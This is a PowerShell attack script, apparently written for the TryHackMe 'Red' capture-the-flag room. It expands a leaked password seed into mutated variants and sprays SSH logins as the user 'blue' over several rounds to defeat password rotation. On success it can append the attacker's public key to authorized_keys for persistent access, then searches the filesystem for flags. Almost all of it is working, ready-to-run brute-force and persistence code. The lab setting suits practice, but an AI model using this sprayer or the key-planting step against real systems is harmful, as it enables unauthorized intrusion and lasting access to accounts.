<#
.SYNOPSIS
    Seed -> best64-style mutation -> SSH spray for TryHackMe "Red".
    Takes the password seed you leaked from /home/blue/.reminder, expands it
    into the likely rotated variants, and sprays SSH as `blue` until one logs
    in. On success it can auto-install your SSH public key so the rotating
    password stops mattering. Loops for several rounds to beat the rotation.
.USAGE
    .\spray_red.ps1 -Target 10.146.184.99 -Seed 'sup3r_p@s$w0rd!'
    .\spray_red.ps1 -Target 10.146.184.99 -Seed 'sup3r_p@s$w0rd!' -PubKey "$HOME\.ssh\id_ed25519.pub"
    # or feed a real hashcat best64 list instead of the built-in mutator:
    .\spray_red.ps1 -Target 10.146.184.99 -PassList .\passlist.txt
#>
param(
    [Parameter(Mandatory=$true)][string]$Target,
    [string]$User    = 'blue',
    [string]$Seed = 'sup3r_p@s$w0rd!',  # the leaked .reminder value
    [string]$PassList,                   # optional: use a ready wordlist (e.g. hashcat best64 output)
    [string]$PubKey,                     # optional: path to your .pub -> auto-dropped on success
    [int]$Rounds     = 4,                # full spray passes (beats the rotation window)
    [int]$DelayMs    = 250
)

# --- ensure Posh-SSH ---------------------------------------------------------
if (-not (Get-Module -ListAvailable -Name Posh-SSH)) {
    Write-Host "[*] Installing Posh-SSH (one-time)..." -ForegroundColor Cyan
    Install-Module Posh-SSH -Scope CurrentUser -Force -AllowClobber
}
Import-Module Posh-SSH -ErrorAction Stop

# --- build the candidate list ------------------------------------------------
function Get-Candidates {
    param([string]$w)
    $o = [System.Collections.Generic.List[string]]::new()
    $add = { param($s) if ($s -and -not $o.Contains($s)) { $o.Add($s) } }

    # base forms (most-likely first so a hit comes early, before the next rotation)
    & $add $w
    & $add ($w.ToLower()); & $add ($w.ToUpper())
    & $add ((Get-Culture).TextInfo.ToTitleCase($w.ToLower()))
    if ($w.Length -ge 1) { & $add ([char]::ToUpper($w[0]) + $w.Substring(1)) }   # toggle first char

    $bases = @($w, $w.ToLower(), ([char]::ToUpper($w[0]) + $w.Substring(1)))
    foreach ($b in $bases) {
        0..9 | ForEach-Object { & $add "$b$_" }                                   # append single digit
        '!','!!','?','.','1','12','123','1234','01','007','2021','2022','2023','2024','2025','@','#','$','_' |
            ForEach-Object { & $add "$b$_" }                                      # common suffixes
        & $add "$b$b"                                                            # doubled
    }
    # leet swaps both directions (seed already partly leet)
    & $add ($w -replace 'a','@' -replace 'o','0' -replace 'e','3' -replace 's','$' -replace 'i','1')
    & $add ($w -replace '@','a' -replace '0','o' -replace '3','e' -replace '\$','s' -replace '1','i')
    return $o
}

if ($PassList) {
    $cands = Get-Content $PassList
    Write-Host "[*] Loaded $($cands.Count) candidates from $PassList" -ForegroundColor Cyan
} elseif ($Seed) {
    $cands = Get-Candidates $Seed
    Write-Host "[*] Generated $($cands.Count) candidates from seed '$Seed'" -ForegroundColor Cyan
} else {
    throw "Provide -Seed <leaked password> or -PassList <file>."
}

# --- spray -------------------------------------------------------------------
function Try-Login {
    param([string]$pw)
    $cred = New-Object PSCredential($User, (ConvertTo-SecureString $pw -AsPlainText -Force))
    try {
        $s = New-SSHSession -ComputerName $Target -Credential $cred -AcceptKey -ConnectionTimeout 8 -ErrorAction Stop
        if ($s.Connected) { return $s }
    } catch {}   # "Permission denied" throws here -> next candidate
    return $null
}

$hitSession = $null; $hitPw = $null
:outer for ($r = 1; $r -le $Rounds -and -not $hitSession; $r++) {
    Write-Host "[*] Spray round $r/$Rounds ..." -ForegroundColor Cyan
    foreach ($pw in $cands) {
        $s = Try-Login $pw
        if ($s) { $hitSession = $s; $hitPw = $pw; break outer }
        Start-Sleep -Milliseconds $DelayMs
    }
}

if (-not $hitSession) {
    Write-Host "[-] No candidate worked across $Rounds rounds. If the seed is right, widen the list" -ForegroundColor Yellow
    Write-Host "    (real hashcat best64 via -PassList) or raise -Rounds; the password may rotate mid-pass." -ForegroundColor Yellow
    return
}

Write-Host "[+] SUCCESS  $User : $hitPw" -ForegroundColor Green

# --- optional: drop your key so rotation stops mattering ---------------------
if ($PubKey -and (Test-Path $PubKey)) {
    $key = (Get-Content $PubKey -Raw).Trim()
    $cmd = "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '$key' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo KEY_INSTALLED"
    $res = Invoke-SSHCommand -SessionId $hitSession.SessionId -Command $cmd
    if ($res.Output -match 'KEY_INSTALLED') {
        Write-Host "[+] Public key installed. Re-enter anytime with:" -ForegroundColor Green
        Write-Host "    ssh -i $($PubKey -replace '\.pub$','') $User@$Target" -ForegroundColor Green
    } else {
        Write-Host "[!] Key install may have failed: $($res.Output -join ' ')" -ForegroundColor Yellow
    }
}

# quick proof + first-flag hunt
$who = Invoke-SSHCommand -SessionId $hitSession.SessionId -Command "id; echo '--- flags ---'; find / -iname '*flag*' 2>/dev/null; ls -la ~"
$who.Output | ForEach-Object { Write-Host $_ }
Remove-SSHSession -SessionId $hitSession.SessionId | Out-Null